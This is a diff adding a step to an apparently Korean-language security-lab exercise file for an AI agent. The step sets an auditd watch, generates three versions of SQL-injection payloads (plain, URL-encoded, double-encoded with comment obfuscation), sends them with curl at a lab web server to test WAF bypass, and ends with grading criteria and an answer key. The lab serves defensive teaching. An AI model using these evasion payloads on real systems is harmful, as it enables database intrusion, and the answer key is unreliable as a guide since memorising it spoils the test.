@@ -464,3 +464,85 @@ steps:
     auditctl -l | wc -l
   risk_level: low
   bastion_prompt: auditd 감시 해제(실습 후 정리).
+- order: 100
+  instruction: '[Multi-task] Transient Tool 5단계 통합 — auditd 감시 → Tool 3 버전 생성 → 이벤트 조회 → SQLi → WAF 우회.'
+  bastion_prompt: |
+    Transient Tool 의 자동 익스플로잇 5작업을 한 흐름의 분석으로 수행해줘.
+
+    1) [auditd /tmp 쓰기 감시 룰 추가] ssh ccc@{{WEB_IP}} 'sudo auditctl -W /tmp -p wa -k tmpwrites;
+       sudo auditctl -l | grep tmpwrites' 의 룰 추가 + 확인. NIST DE.CM-7 매핑.
+
+    2) [Transient Tool 3 버전 생성 시뮬] ssh ccc@{{WEB_IP}} 'cat > /tmp/tool_v1.py <<EOF
+       # v1: 단순 SQLi 페이로드 생성
+       def gen(): return "id=1 UNION SELECT 1,2,3"
+       EOF
+       cat > /tmp/tool_v2.py <<EOF
+       # v2: URL 인코딩 추가
+       import urllib.parse
+       def gen(): return urllib.parse.quote("id=1 UNION SELECT 1,2,3")
+       EOF
+       cat > /tmp/tool_v3.py <<EOF
+       # v3: 이중 인코딩 + comment 변형
+       import urllib.parse
+       def gen():
+         p = "id=1/**/UNION/**/SELECT/**/1,2,3"
+         return urllib.parse.quote(urllib.parse.quote(p))
+       EOF
+       ls -lt /tmp/tool_v*.py' 의 3 버전 (자가 수정 루프) + 각 의 evolution 표.
+
+    3) [auditd 이벤트 조회] ssh ccc@{{WEB_IP}} 'sleep 3; sudo ausearch -k tmpwrites --start "5 minutes ago"
+       2>/dev/null | grep -E "type=(SYSCALL|PATH)" | head -20; sudo ausearch -k tmpwrites --start "5 minutes
+       ago" -i 2>/dev/null | grep "name=/tmp/tool" | head -10' 의 3 tool 의 create 이벤트 + name= 추출 + execve
+       vs creat syscall 카운트 표.
+
+    4) [WAF 단일 페이로드 (v1) 시도] ssh ccc@{{ATTACKER_IP}} 'PAYLOAD=$(python3 /tmp/tool_v1.py 2>/dev/null ||
+       echo "id=1 UNION SELECT 1,2,3"); curl -s -o /dev/null -w "v1: %{http_code}\n" "{{WEB_IP}}:3000/?$PAYLOAD"'
+       의 403 응답 (ModSec 차단) 확인. OWASP CRS 942 매칭.
+
+    5) [WAF 우회 변형 (v2/v3) 시도 + 비교] ssh ccc@{{ATTACKER_IP}} 'P2=$(python3 /tmp/tool_v2.py); P3=$(python3
+       /tmp/tool_v3.py); curl -s -o /dev/null -w "v2: %{http_code}\n" "{{WEB_IP}}:3000/?$P2"; curl -s -o /dev/null
+       -w "v3: %{http_code}\n" "{{WEB_IP}}:3000/?$P3"' 의 3 버전 의 응답 비교 표 (v1: 403 / v2: 403 또는 200 /
+       v3: 200 우회 성공 가능). 자동 자가 수정 루프 의 학습 효과 분석.
+
+    cleanup: ssh ccc@{{WEB_IP}} 'sudo auditctl -W /tmp -p wa -k tmpwrites -k tmpwrites 2>/dev/null;
+       sudo auditctl -l | grep tmpwrites | xargs -I{} sudo auditctl -W /tmp -p wa -k tmpwrites 2>/dev/null;
+       sudo rm /tmp/tool_v*.py'.
+
+    마지막에 5단계 × (Transient Tool 단계 / 명령 / 결과 / auditd 추적 / WAF 우회 효과 / 방어 권고 (auditd
+    immutable rule / file integrity / Tool sandboxing)) 의 5×6 매트릭스 + Transient Tool Threat Model
+    (Self-modifying loop 의 4 stage: Generate → Test → Mutate → Persist) + 방어 권고 5가지 markdown 출력.
+  hint: Transient Tool 5단계 chain. 자가 수정 루프 의 4 stage 가 학습 핵심. cleanup 필수.
+  category: multi_task
+  points: 50
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+    semantic:
+      intent: '[통합] Transient Tool 5단계 — auditd/Tool 3버전/이벤트/SQLi/WAF 우회. NIST DE.CM-7 + OWASP CRS 942 매핑 + 5×6 매트릭스 + Threat Model.'
+      success_criteria:
+      - 5 단계 모두 실행
+      - auditd 룰 추가 + 이벤트 조회
+      - Tool 3 버전 (v1/v2/v3) 생성
+      - WAF 차단 vs 우회 응답 비교
+      - cleanup (auditd 룰 + tool 파일 제거)
+      - 5×6 매트릭스 + Threat Model
+      acceptable_methods:
+      - bastion 의 multi-stage planning
+      - ssh + auditctl + ausearch + python3 + curl 표준
+      - markdown 매트릭스 + Model
+      negative_signs:
+      - 3 단계 이하 만 수행
+      - Tool 1 버전 만
+      - auditd 추적 누락
+      - WAF 비교 누락
+      - cleanup 미수행
+      - 매트릭스 6 컬럼 미만
+  target_vm: bastion
+  risk_level: low
+  answer: |
+    🤖 위 bastion_prompt 그대로. Transient Tool 5단계 + 5×6 매트릭스 + Threat Model + cleanup.
+  answer_detail: |
+    AI Defense Researcher 페르소나 — Transient Tool 자가 수정 루프 chain. 4 stage Threat Model
+    + 방어 권고 5가지가 학습 산출물.
+  script: ''
